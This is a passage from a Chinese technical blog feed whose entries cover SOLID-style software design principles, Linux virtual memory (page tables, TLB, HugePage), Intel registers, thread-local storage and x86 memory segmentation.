id="缺点">缺点：</h4><ul><li>继承是侵入性的，只要继承就必须拥有父类的所有方法和属性，在一定程度上约束了子类，降低了代码的灵活性；</li><li>增加了耦合，当父类的常量、变量或者方法被修改了，需要考虑子类的修改，所以一旦父类有了变动，很可能会造成非常糟糕的结果，要重构大量的代码。</li></ul><h3 id="isp">3. ISP</h3><p>所谓 <code>ISP</code> 原则，即：<code>Interface Segregation Principle</code>，<strong>接口隔离原则</strong>。原始定义如下：</p><blockquote><p>Clients should not be forced to depend upon interfaces that they do not use.(客户端只依赖于它所需要的接口；它需要什么接口就提供什么接口，把不需要的接口剔除掉。)</p></blockquote><blockquote><p>The dependency of one class to another one should depend on the smallest possible interface.(类间的依赖关系应建立在最小的接口上。)</p></blockquote><p>即，<strong>接口尽量细化，接口中的方法尽量少</strong>。接口隔离原则与单一职责原则的审视角度是不同的，单一职责原则要求的是类和接口职责单一，注重的是职责，这是业务逻辑上的划分，而接口隔离原则要求接口的方法尽量少。根据接口隔离原则拆分接口时，首先必须满足单一职责原则。</p><p>采用接口隔离原则对接口进行约束时，要注意以下几点：</p><ul><li>接口尽量小，但是要有限度。对接口进行细化可以提高程序设计灵活性是不挣的事实，但是如果过小，则会造成接口数量过多，使设计复杂化。所以一定要适度。</li><li>为依赖接口的类定制服务，只暴露给调用的类它需要的方法，它不需要的方法则隐藏起来。只有专注地为一个模块提供定制服务，才能建立最小的依赖关系。</li><li>提高内聚，减少对外交互。使接口用最少的方法去完成最多的事情。</li></ul><p>运用接口隔离原则，一定要适度，接口设计的过大或过小都不好。设计接口的时候，只有多花些时间去思考和筹划，才能准确地实践这一原则。</p><h3 id="ocp">4. OCP</h3><p>所谓 <code>OCP</code> 原则，即：<code>Open Closed Principle</code>，<strong>开闭原则</strong>。原始定义如下：</p><blockquote><p>software entities (classes, modules, functions, etc.) should be open for extension, but closed for modification.(对扩展开放，对修改关闭)</p></blockquote><p>开闭原则（<code>OCP</code>）是面向对象设计中 “可复用设计” 的基石，是面向对象设计中最重要的原则之一，其它很多的设计原则和设计模式都是实现开闭原则的一种手段。核心就是：<strong>对扩展开放，对修改关闭</strong>。其含义是说一个软件应该通过扩展来实现变化，而不是通过修改已有的代码来实现变化的。</p><p>软件系统中包含的各种组件，例如模块（<code>Module</code>）、类（<code>Class</code>）以及功能（<code>Function</code>）等等，应该在不修改现有代码的基础上，引入新功能。开闭原则中 “开”，是指对于组件功能的扩展是开放的，是允许对其进行功能扩展的；开闭原则中 “闭”，是指对于原有代码的修改是封闭的。</p><p>实现开闭原则的关键就在于 “<strong>抽象</strong>”。把系统的所有可能的行为抽象成一个抽象底层，这个抽象底层规定出所有的具体实现必须提供的方法的特征。作为系统设计的抽象层，要预见所有可能的扩展，从而使得在任何扩展情况下，系统的抽象底层不需修改；同时，由于可以从抽象底层导出一个或多个新的具体实现，可以改变系统的行为，因此系统设计对扩展是开放的。在实际开发过程的设计开始阶段，就要罗列出来系统所有可能的行为，并把这些行为加入到抽象底层，根本就是不可能的，这么去做也是不经济的。因此我们应该现实的接受修改拥抱变化，使我们的代码可以对扩展开放，对修改关闭。</p><p>开闭原则的好处：</p><ul><li>可复用性好；</li><li>可维护性好。</li></ul><h3 id="dip">5. DIP</h3><p>所谓 <code>DIP</code> 原则，即：<code>Dependency Inversion Principle</code>，<strong>依赖倒置原则</strong>。原始定义如下：</p><blockquote><p>High-level modules should not depend on low-level modules. Both should depend on abstractions.(<strong>高层模块不应该依赖低层模块，两者都应该依赖其抽象</strong>)</p></blockquote><blockquote><p>Abstractions should not depend on details. Details should depend on abstractions.(<strong>抽象不应该依赖细节；细节应该依赖抽象</strong>)</p></blockquote><p>面向过程的开发，上层调用下层，上层依赖于下层，当下层剧烈变动时上层也要跟着变动，这就会导致模块的复用性降低而且大大提高了开发的成本。面向对象的开发很好的解决了这个问题，一般情况下抽象的变化概率很小，让用户程序依赖于抽象，实现的细节也依赖于抽象。即使实现细节不断变动，只要抽象不变，客户程序就不需要变化。这大大降低了客户程序与实现细节的耦合度。</p><p>依赖倒置原则主要有以下三层含义：</p><ul><li>高层模块不应该依赖低层模块，两者都应该依赖其抽象（抽象类或接口）；</li><li>抽象不应该依赖细节（具体实现）；</li><li>细节（具体实现）应该依赖抽象。</li></ul><p>依赖倒置原则基于这样一个事实：<strong>相对于细节的多变性，抽象的东西要稳定的多</strong>。以抽象为基础搭建起来的架构比以细节为基础搭建起来的架构要稳定的多。在 Java 中，抽象指的是接口或者抽象类，细节就是具体的实现类，使用接口或者抽象类的目的是制定好规范和契约，而不去涉及任何具体的操作，把展现细节的任务交给他们的实现类去完成。<strong>依赖倒置原则的核心思想就是面向接口编程</strong>。</p><h3 id="lod-lkp">6. LOD | LKP</h3><p>所谓 <code>LOD</code> 原则，即：<code>Law of Demeter</code>，<strong>迪米特法则</strong>，又叫<strong>最少知识原则</strong>（<code>Least Knowledge Principle</code>，简写 <code>LKP</code>），就是说一个对象应当对其他对象有尽可能少的了解。通俗的讲，一个类应该对自己需要耦合或调用的类知道得最少，被耦合的类是如何的复杂都和我没关系，即为 “不和陌生人说话”。迪米特法则的英文解释如下：</p><blockquote><p>talk only to your immediate friends.(<strong>只与直接的朋友通信</strong>)</p></blockquote><p><strong>迪米特法则的初衷在于降低类之间的耦合</strong>。由于每个类尽量减少对其他类的依赖，因此，很容易使得系统的功能模块功能独立，相互之间不存在（或很少有）依赖关系。</p><p>迪米特法则不希望类之间建立直接的联系。如果真的有需要建立联系，也希望能通过它的 “朋友” 类来转达。因此，应用迪米特法则有可能造成的一个后果就是：系统中存在大量的中介类，这些类之所以存在完全是为了传递类之间的相互调用关系 —— 这在一定程度上增加了系统的复杂度，同时也为系统的维护带来了难度。所以，在采用迪米特法则时需要反复权衡，不遵循不对，严格执行又会 “过犹不及”。既要做到让结构清晰，又要做到高内聚低耦合。</p><h3 id="crp">7. CRP</h3><p>所谓 <code>CRP</code> 原则，即：<code>Composite Reuse Principle</code>，<strong>组合复用原则</strong>。</p><p>组合复用原则的核心思想是：<strong>尽量使用对象组合，而不是继承来达到复用的目的</strong>。该原则就是在一个新的对象里面使用一些已有的对象，使之成为新对象的一部分：新的对象通过向这些对象的委派达到复用已有功能的目的。</p><p>继承的缺点主要有以下几点：</p><ul><li>继承复用破坏数据封装性，将基类的实现细节全部暴露给了派生类，基类的内部细节常常对派生类是透明的，白箱复用。虽然简单，但不安全，不能在程序的运行过程中随便改变。</li><li>基类的实现发生了改变，派生类的实现也不得不改变。</li><li>从基类继承而来的派生类是静态的，不可能在运行时间内发生改变，因此没有足够的灵活性。</li></ul><p>由于组合可以将已有的对象纳入到新对象中，使之成为新对象的一部分，因此新对象可以调用已有对象的功能，这样做有下面的好处：</p><ul><li>新对象存取<code>组成对象</code>的唯一方法是通过<code>组成对象</code>的 <code>getter/setter</code> 方法。</li><li>组合复用是黑箱复用，因为组成对象的内部细节是新对象所看不见的。</li><li>组合复用所需要的依赖较少。</li><li>每一个新的类可以将焦点集中到一个任务上。</li><li>组合复用可以在运行时间动态进行，新对象可以动态的引用与成分对象类型相同的对象。</li></ul><p>组合复用的缺点：就是用组合复用建造的系统会有较多的对象需要管理。</p><p>组合复用原则可以使系统更加灵活，类与类之间的耦合度降低，一个类的变化对其他类造成的影响相对较少，因此一般首选使用组合来实现复用；其次才考虑继承。在使用继承时，需要严格遵循里氏代换原则，有效使用继承会有助于对问题的理解，降低复杂度，而滥用继承反而会增加系统构建和维护的难度以及系统的复杂度，因此需要慎重使用继承复用。</p><p>使用继承时必须满足 <code>Is-A</code> 的关系是才能使用继承，而组合却是一种 <code>Has-A</code> 的关系。导致错误的使用继承而不是使用组合的一个重要原因可能就是错误的把 <code>Has-A</code> 当成了 <code>Is-A</code>。</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.arg.pub" data-pjax-state="">Thomas</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.arg.pub/2022/09/07/se/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/" data-pjax-state="">https://blog.arg.pub/2022/09/07/se/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</a></span></div>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux内存管理(1)</title>
    <link href="/2024/01/05/linux%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-1/"/>
    <url>/2024/01/05/linux%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-1/</url>
    
    <content type="html"><![CDATA[<p>Linux内存管理（1）</p><span id="more"></span><div id="article_content" class="article_content clearfix">        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-044f2cf1dc.css">                <div id="content_views" class="htmledit_views">                    <p>&nbsp;</p> <h2><a name="t0"></a>虚拟内存</h2> <p>我们知道一个进程是与其他进程共享CPU和内存资源的。为了防止进程之间内存泄漏的问题，现代操作系统提供了一种对主存的抽象概念，即是虚拟内存（Virtual Memory）。<strong>虚拟内存为每个进程提供了一个一致的、私有的地址空间，它让每个进程产生了一种自己在独享主存的错觉（每个进程拥有一片连续完整的内存空间）</strong>。</p> <p>因为使用虚拟地址可以带来诸多好处：</p> <ol><li>在支持多进程的系统中，如果各个进程的镜像文件都使用物理地址，则在加载到同一物理内存空间的时候，可能发生冲突。</li><li>直接使用物理地址，不便于进行进程地址空间的隔离。</li><li>物理内存是有限的，在物理内存整体吃紧的时候，可以让多个进程通过分时复用的方法共享一个物理页面（某个进程需要保存的内容可以暂时swap到外部的disk/flash），这有点类似于多线程分时复用共享CPU的方式。</li></ol> <p>既然使用虚拟地址，就涉及到将虚拟地址转换为物理地址的过程，也即CPU寻址。</p> <h3 id="user-content-cpu-"><a name="t1"></a>CPU寻址</h3> <p>内存通常被组织为一个由M个连续的字节大小的单元组成的数组，每个字节都有一个唯一的物理地址（Physical Address PA），作为到数组的索引。CPU访问内存最简单直接的方法就是使用物理地址，这种寻址方式被称为物理寻址。</p> <p>现代处理器使用的是一种称为虚拟寻址（Virtual Addressing）的寻址方式。<span style="color:#f33b45;"><strong>使用虚拟寻址，CPU需要将虚拟地址翻译成物理地址，这样才能访问到真实的物理内存。它</strong>需要MMU（Memory Management Unit）和页表（page table）的共同参与。</span></p> <h4><a name="t2"></a>MMU</h4> <p>MMU是处理器/核（processer）中的一个硬件单元，通常每个核有一个MMU。<strong>它的功能是将虚拟地址转换为物理地址。MMU需要借助存放在内存中的页表(page table)来动态翻译虚拟地址，该页表由操作系统管理。</strong></p> <p>MMU由两部分组成：TLB(Translation Lookaside Buffer)和table walk unit。</p> <p><img alt="" src="https://img-blog.csdnimg.cn/img_convert/1d1f34f03d43a06efe6675bb1a8ea2b7.png" width="241"></p> <h4><a name="t3"></a><strong>Page Table</strong></h4> <p>page table是每个进程独有的，是软件实现的，是存储在main memory（比如DDR）中的。所谓<strong>页表就是一个存放在物理内存中的数据结构，它记录了虚拟页与物理页的映射关系。</strong></p> <p><strong>页表是一个元素为页表条目（Page Table Entry, PTE）的集合，每个虚拟页在页表中一个固定偏移量的位置上都有一个PTE</strong>。下面是PTE仅含有一个有效位标记的页表结构，该有效位代表这个虚拟页是否被缓存在物理内存中。</p> <p><img alt="" height="424" src="https://img-blog.csdnimg.cn/img_convert/feb88f038a0774dfe18a1a640e8829d3.png" width="540"></p> <p>虚拟页<code>VP 0</code>、<code>VP 4</code>、<code>VP 6</code>、<code>VP 7</code>被缓存在物理内存中，虚拟页<code>VP 2</code>和<code>VP 5</code>被分配在页表中，但并没有缓存在物理内存，虚拟页<code>VP 1</code>和<code>VP 3</code>还没有被分配。</p> <p>在进行动态内存分配时，例如<code>malloc()</code>函数或者其他高级语言中的<code>new</code>关键字，操作系统会在硬盘中创建或申请一段虚拟内存空间，并更新到页表（分配一个PTE，使该PTE指向硬盘上这个新创建的虚拟页）。</p> <h4><a name="t4"></a>页命中</h4> <p>如下图所示，MMU根据虚拟地址在页表中寻址到了<code>PTE 4</code>，该PTE的有效位为1，代表该虚拟页已经被缓存在物理内存中了，最终MMU得到了PTE中的物理内存地址（指向<code>PP 1</code>）。</p> <p><img alt="" height="366" src="https://img-blog.csdnimg.cn/img_convert/3d2f9a7a09e800769fd1d027d11305ce.png" width="529"></p> <h4><a name="t5"></a>缺页</h4> <p>如下图所示，MMU根据虚拟地址在页表中寻址到了<code>PTE 2</code>，该PTE的有效位为0，代表该虚拟页并没有被缓存在物理内存中。<strong>虚拟页没有被缓存在物理内存中（缓存未命中）被称为缺页。</strong></p> <p><img alt="" height="561" src="https://img-blog.csdnimg.cn/img_convert/d4a85562bfa7cbbd165b1d8bdacddeaf.png" width="810"></p> <p>当CPU遇见缺页时会触发一个缺页异常，缺页异常将控制权转向操作系统内核，<span style="color:#f33b45;">然后调用内核中的缺页异常处理程序</span>，<span style="color:#f33b45;">该程序会选择一个牺牲页，如果牺牲页已被修改过，内核会先将它复制回硬盘</span>（采用写回机制而不是直写也是为了尽量减少对硬盘的访问次数），<span style="color:#f33b45;">然后再把该虚拟页覆盖到牺牲页的位置，并且更新PTE。</span></p> <p><strong>当缺页异常处理程序返回时，它会重新启动导致缺页的指令，该指令会把导致缺页的虚拟地址重新发送给MMU</strong>。由于现在已经成功处理了缺页异常，所以最终结果是页命中，并得到物理地址。</p> <p>这种在硬盘和内存之间传送页的行为称为页面调度（paging）：页从硬盘换入内存和从内存换出到硬盘。当缺页异常发生时，才将页面换入到内存的策略称为按需页面调度（demand paging），所有现代操作系统基本都使用的是按需页面调度的策略。</p> <p><strong>虚拟内存跟CPU高速缓存（或其他使用缓存的技术）一样依赖于局部性原则</strong>。虽然处理缺页消耗的性能很多（毕竟还是要从硬盘中读取），而且程序在运行过程中引用的不同虚拟页的总数可能会超出物理内存的大小，但是<strong>局部性原则保证了在任意时刻，程序将趋向于在一个较小的活动页面（active page）集合上工作，这个集合被称为工作集（working set）</strong>。根据空间局部性原则（一个被访问过的内存地址以及其周边的内存地址都会有很大几率被再次访问）与时间局部性原则（一个被访问过的内存地址在之后会有很大几率被再次访问），只要将工作集缓存在物理内存中，接下来的地址翻译请求很大几率都在其中，<span style="color:#f33b45;">从而减少了额外的硬盘流量</span>。</p> <p>如果一个程序没有良好的局部性，将会使工作集的大小不断膨胀，直至超过物理内存的大小，这时程序会产生一种叫做抖动（thrashing）的状态，页面会不断地换入换出，如此多次的读写硬盘开销，性能自然会十分“恐怖”。<strong>所以，想要编写出性能高效的程序，首先要保证程序的时间局部性与空间局部性。</strong></p> <h4><a name="t6"></a>多级页表</h4> <p>上面讨论的只是单页表，但在实际的环境中虚拟空间地址都是很大的（一个32位系统的地址空间有<code>2^32 = 4GB</code>，更别说64位系统了）。在这种情况下，使用一个单页表明显是效率低下的，而且非常占内存空间。</p> <p><strong>常用方法是使用层次结构的页表</strong>。</p> <p>假设我们的环境为一个32位的虚拟地址空间，它有如下形式：</p> <ul><li> <p>虚拟地址空间被分为4KB的页，每个PTE都是4字节。</p> </li><li> <p>内存的前2K个页面分配给了代码和数据。</p> </li><li> <p>之后的6K个页面还未被分配。</p> </li><li> <p>再接下来的1023个页面也未分配，其后的1个页面分配给了用户栈。</p> </li></ul> <p>下图是为该虚拟地址空间构造的二级页表层次结构（真实情况中多为四级或更多），一级页表（1024个PTE正好覆盖4GB的虚拟地址空间，同时每个PTE只有4字节，这样一级页表与二级页表的大小也正好与一个页面的大小一致都为4KB）的每个PTE负责映射虚拟地址空间中一个4MB的片（chunk），每一片都由1024个连续的页面组成。二级页表中的每个PTE负责映射一个4KB的虚拟内存页面。</p> <p><img alt="" height="469" src="https://img-blog.csdnimg.cn/img_convert/0c32d5ffdb425520ef17c0139916d91c.png" width="822"></p> <p>这个结构看起来很像是一个<code>B-Tree</code>，这种层次结构有效的减缓了内存要求：</p> <ul><li> <p>如果一个一级页表的一个PTE是空的，那么相应的二级页表也不会存在。这代表一种巨大的潜在节约（对于一个普通的程序来说，虚拟地址空间的大部分都会是未分配的）。</p> </li><li> <p>只有一级页表才总是需要缓存在内存中的，这样虚拟内存系统就可以在需要时创建、页面调入或调出二级页表（只有经常使用的二级页表才会被缓存在内存中），这就减少了内存的压力。</p> </li></ul> <h4><a name="t7"></a>TLB</h4> <p>表是被缓存在内存中的，尽管内存的速度相对于硬盘来说已经非常快了，但与CPU还是有所差距。<strong>为了防止每次地址翻译操作都需要去访问内存，CPU使用了高速缓存与TLB来缓存PTE。</strong>CPU会首先在TLB中查找，因为在TLB中找起来很快。TLB之所以快，一是因为它含有的entries的数目较少，二是TLB是集成进CPU的，它几乎可以按照CPU的速度运行。</p> <p>TLB（Translation Lookaside Buffer, TLB）旁路缓冲器,或叫做页表缓存，它是<strong><span style="color:#f33b45;">MMU中的一个缓冲区。</span></strong></p> <p>TLB命中：</p> <p><img alt="" height="368" src="https://img-blog.csdnimg.cn/img_convert/d9172f502ec842ce42ec6f6491a27d3a.png" width="681"></p> <ul><li> <p>第一步，CPU将一个虚拟地址交给MMU进行地址翻译。</p> </li><li> <p>第二步和第三步，MMU通过TLB取得相应的PTE。</p> </li><li> <p>第四步，MMU通过PTE翻译出物理地址并将它发送给高速缓存/内存。</p> </li><li> <p>第五步，高速缓存返回数据到CPU（如果缓存命中的话，否则还需要访问内存）。</p> </li></ul> <p>TLB未命中:</p> <p><strong>当TLB未命中时，MMU必须从高速缓存/内存中取出相应的PTE，并将新取得的PTE存放到TLB（如果TLB已满会覆盖一个已经存在的PTE）。如下图：</strong></p> <p><img alt="" height="336" src="https://img-blog.csdnimg.cn/img_convert/68434b70cc9ff19f148027942d6368d2.png" width="621"></p> <p>综上，整个cpu寻址的过程可以用下图表示：<br><img alt="" height="332" src="https://img-blog.csdnimg.cn/img_convert/ff279174a496bc9270bf0c37b0abdb3b.png" width="555"></p> <p><br> &nbsp;</p> <p>如果在TLB中找到了含有该虚拟地址的entry（TLB hit），则可从该entry【1】中直接获取对应的物理地址，否则就不幸地TLB miss了，就得去查找当前进程的page table。这个时候，组成MMU的另一个部分table walk unit就被召唤出来了，这里面的table就是page table。</p> <p>如果在page table中找到了该虚拟地址对应的entry的p（present）位是1，说明该虚拟地址对应的物理页面当前驻留在内存中，也就是page table hit。找到了还没完，接下来还有两件事要做：</p> <ol><li>既然是因为在TLB里找不到才找到这儿来的，自然要更新TLB。</li><li>进行权限检测，包括可读/可写/可执行权限，user/supervisor模式权限等。如果没有正确的权限，将触发SIGSEGV（Segmantation Fault）。</li></ol> <p>如果该虚拟地址对应的entry的p位是0，就会触发page fault（缺页中断），可能有这几种情况：</p> <ol><li>这个虚拟地址被分配后还从来没有被access过（比如malloc之后还没有操作分配到的空间，则不会真正分配物理内存）。触发page fault后分配物理内存，也就是demand paging，有了确定的demand了之后才分，然后将p位置1。</li><li>对应的这个物理页面的内容被换出到外部的disk/flash了，这个时候page table entry里存的是换出页面在外部swap area里暂存的位置，可以将其换回物理内存，再次建立映射，然后将p位置1。</li></ol> <p>如果这个虚拟地址在进程的page table中根本不存在，说明这个虚拟地址不在该进程的地址空间中，这时也会触发segmantation fault。</p> <h2><a name="t8"></a>HugePage</h2> <p>上面中提到使用多级页表的方式对于减少页表自身占用的内存空间确实是非常有效的。然而，为此付出的代价就是增加了地址转换过程中对内存的访问次数，进而增加了转换时间。那在除了前面介绍的TLB之外，还有哪些可以减少内存访问次数，加快地址转换的方法呢？HugePage即可以。</p> <p>而HugePage它是使用较大的内存页来代替默认的4k大小，这就意味相同的物理内存，内存页的数量会更少，所以需要的page table（页表条目也会变少），同样TLB的条目数也会变少。<br> 好处是：<br> 节约了页表所占用的内存大小，并且地址转换变少。所以缺页中断变少，TLBmiss变少。从而提高了内存访问性能、TLB命中率，从整体上提高了系统的效率 。</p> <p>另外，由于地址转换所需的信息一般保存在CPU的缓存中，huge page的使用让地址转换信息减少，从而减少了CPU缓存的使用，减轻了CPU缓存的压力，让CPU缓存能更多地用于应用程序的数据缓存，也能够在整体上提升系统的性能。</p> <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/qq_35462323/article/details/111355107">https://blog.csdn.net/qq_35462323/article/details/111355107</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>intel寄存器</title>
    <link href="/2024/01/03/intel%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2024/01/03/intel%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>总结Intel中的使用的寄存器</p><span id="more"></span><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>在intel中，以E开头的是32位的寄存器<br>以R开头的是64位寄存器<br>16位的没有前缀<br>如RIP、EIP、IP</p><h1 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h1><pre><code class="hljs">CS：代码段寄存器DS：数据段寄存器ES：扩展段寄存器SS：栈段寄存器GS：通用段寄存器FS：通用段寄存器</code></pre><h1 id="指令寄存器"><a href="#指令寄存器" class="headerlink" title="指令寄存器"></a>指令寄存器</h1><p>IP、EIP、RIP：保存着下一条指令的地址</p><h1 id="位寄存器"><a href="#位寄存器" class="headerlink" title="位寄存器"></a>位寄存器</h1><p>RFLAGE：位寄存器，有许多位，每一位对应这消息。</p><h1 id="系统表指针寄存器"><a href="#系统表指针寄存器" class="headerlink" title="系统表指针寄存器"></a>系统表指针寄存器</h1><pre><code class="hljs">    GDTR：保存的是GDT的大小和位置，全局描述符表    LDTR：LDT的大小和位置，本地描述符表    IDTR：IDT的大小和位置，中断向量表    TR：保存TSS的选择器和TSS的基址。</code></pre><p>（Tsak Register）TSS是任务状态段，OS为了进程之间的切换。需要保存进程之间的信息。该寄存器指向当前正在执行的线程的TSS。而线程切换事实上就是TR指向不同的TSS，这样CPU就会自动保存当前的EAX，EBX的信息到相应的TSS中，并将新的线程的信息加载到寄存器。</p><h1 id="控制寄存器-Control-Register"><a href="#控制寄存器-Control-Register" class="headerlink" title="控制寄存器 (Control Register)"></a>控制寄存器 (Control Register)</h1><p>CR0-15：共16个</p><h1 id="边界寄存器：-Bounds-Register"><a href="#边界寄存器：-Bounds-Register" class="headerlink" title="边界寄存器：(Bounds Register)"></a>边界寄存器：(Bounds Register)</h1><pre><code class="hljs">BND0 - BND3：单独的128位寄存器，每个都包含一对绑定的地址。BNDCFG: 绑定配置，内核模式。BNDCFU: 绑定配置，用户模式。BNDSTATUS: 绑定状态，在一个#BR被提出后。</code></pre><h1 id="调试寄存器：-Debug-Register"><a href="#调试寄存器：-Debug-Register" class="headerlink" title="调试寄存器：(Debug Register)"></a>调试寄存器：(Debug Register)</h1><pre><code class="hljs">DR0-7：共8个</code></pre><h1 id="测试寄存器：-Test-Register"><a href="#测试寄存器：-Test-Register" class="headerlink" title="测试寄存器：(Test Register)"></a>测试寄存器：(Test Register)</h1><pre><code class="hljs">TR0-7：共8个</code></pre>]]></content>
    
    
    <categories>
      
      <category>intel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TLS线程本地存储</title>
    <link href="/2024/01/03/TLS%E7%BA%BF%E7%A8%8B%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/"/>
    <url>/2024/01/03/TLS%E7%BA%BF%E7%A8%8B%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/</url>
    
    <content type="html"><![CDATA[<p>记载TLS的相关知识点</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们知道在一个进程中，<strong>所有线程是共享同一个地址空间的</strong>。所以，如果一个变量是全局的或者是静态的，那么所有线程访问的是同一份，如果某一个线程对其进行了修改，也就会影响到其他所有的线程。不过我们可能并不希望这样，所以更多的推荐用基于堆栈的自动变量或函数参数来访问数据(也就是使用非static的、局部的对象)，因为基于堆栈的变量总是和特定的线程相联系的。C 库的许多函数使用的 <code>errno</code> 就是一个例子。</p><p>不过如果某些时候，我们就是需要依赖全局变量或者静态变量，那有没有办法保证在多线程程序中能访问而不互相影响呢？答案是有的。操作系统帮我们提供了这个功能——TLS线程本地存储。TLS的作用是能将数据和执行的特定的线程联系起来。每一个线程都会有一个本地的副本，相当于每个线程都拥有了这个对象一样。</p><h1 id="Linux中的线程本地存储"><a href="#Linux中的线程本地存储" class="headerlink" title="Linux中的线程本地存储"></a>Linux中的线程本地存储</h1><p>在Linux中，如果想要使用创建线程本地存储只需要使用关键字<code>_thread</code>。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何合理配置个人资产</title>
    <link href="/2024/01/03/%E5%A6%82%E4%BD%95%E5%90%88%E7%90%86%E9%85%8D%E7%BD%AE%E4%B8%AA%E4%BA%BA%E8%B5%84%E4%BA%A7/"/>
    <url>/2024/01/03/%E5%A6%82%E4%BD%95%E5%90%88%E7%90%86%E9%85%8D%E7%BD%AE%E4%B8%AA%E4%BA%BA%E8%B5%84%E4%BA%A7/</url>
    
    <content type="html"><![CDATA[<p>如何合理配置个人资产</p><span id="more"></span><h1 id="如何合理配置个人资产"><a href="#如何合理配置个人资产" class="headerlink" title="如何合理配置个人资产"></a>如何合理配置个人资产</h1><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210312135502.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cpu的内存管理</title>
    <link href="/2024/01/02/cpu%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2024/01/02/cpu%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>cpu的内存管理的总结</p><span id="more"></span><h1 id="cpu运行模式下的内存管理"><a href="#cpu运行模式下的内存管理" class="headerlink" title="cpu运行模式下的内存管理"></a>cpu运行模式下的内存管理</h1><p>实际上Linux中的内存管理和cpu中的运行模式是紧密相关的。那么我们可以知道cpu有哪些运行模式了。这篇文件对运行模式进行了简单的总结。</p><p>下面这张图体现了各个模式下的内存模型，在除开<code>64bit长模式</code>下，其他模式的内存模型都是分段的。32 位虚拟内存空间被视为代码、堆栈和数据段的分段地址空间集，每个段都有自己的基地址和保护参数。通过将段选择器添加到地址来指定分段空间。</p><p>而长模式下，<code>64</code> 位虚拟内存空间<strong>被视为单个、平坦（未分段）地址空间</strong>。程序地址访问位置可以位于线性 <code>64</code> 位地址空间中的任何位置。出于内存保护的目的，操作系统可以对代码、堆栈和数据段使用单独的选择器，但所有这些段的基地址始终为 <code>0</code>。</p><p>注意一个是<code>64bit</code>地址空间，另外几个都是<code>32bit</code>地址空间。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401011751164.png"></p><p>注意<code>64bit</code>这里是平坦内存模型，与之相对应的是多段内存模型，平坦内存模型中，每个寄存器中的值都是0，所以使得每一个段一开始都是指向同一个地方的。</p><p>分段内存模型的内存管理：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401022115917.png"></p><p>具体的：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401022138030.png"></p><p>平坦内存模型的内存管理：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401022136743.png"></p><p>Effective Address：有效地址</p><p>具体的：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401022138791.png"></p><h1 id="分段内存管理"><a href="#分段内存管理" class="headerlink" title="分段内存管理"></a>分段内存管理</h1><p>以兼容性著称的x86处理器，即便到了今天的64位时代，依然保留了对segmentation的向前兼容，而linux操作系统最开始也是基于i386写的，所以也保留了对segmentation的支持。了解下历史，往往可以让我们对后来出现的某些事物有更好的理解。</p><p>分段机制提供十个段寄存器，每个段寄存器定义一个段。其中六个寄存器（CS、DS、ES、FS、GS 和 SS）定义<strong>用户段</strong>。用户段保存软件、数据和堆栈，可供应用软件和系统软件使用。其余四个段寄存器（GDT、LDT、IDT 和 TR）<strong>定义系统段</strong>。系统段包含仅由系统软件初始化和使用的数据结构。段寄存器包含指向段起始位置的基地址、定义段大小的限制以及定义段保护特性的属性。</p><p>尽管分段在重新定位和保护软件和数据方面提供了很大的灵活性，但结合软件和硬件分页支持来处理内存隔离和重新定位通常会更有效。因此，大多数现代系统软件都会绕过分段功能。然而，分段不能完全禁用，了解分段机制对于实现长模式系统软件非常重要。这是由于在传统模式中仍然需要使用到分段功能，</p><p>下面我们通过对于各个cpu模式的分析，来学习cpu的分段机制。</p><h2 id="分段所使用的数据结构、寄存器"><a href="#分段所使用的数据结构、寄存器" class="headerlink" title="分段所使用的数据结构、寄存器"></a>分段所使用的数据结构、寄存器</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401042013660.png"></p><p>段寄存器——六个段寄存器（CS、DS、ES、FS、GS 和 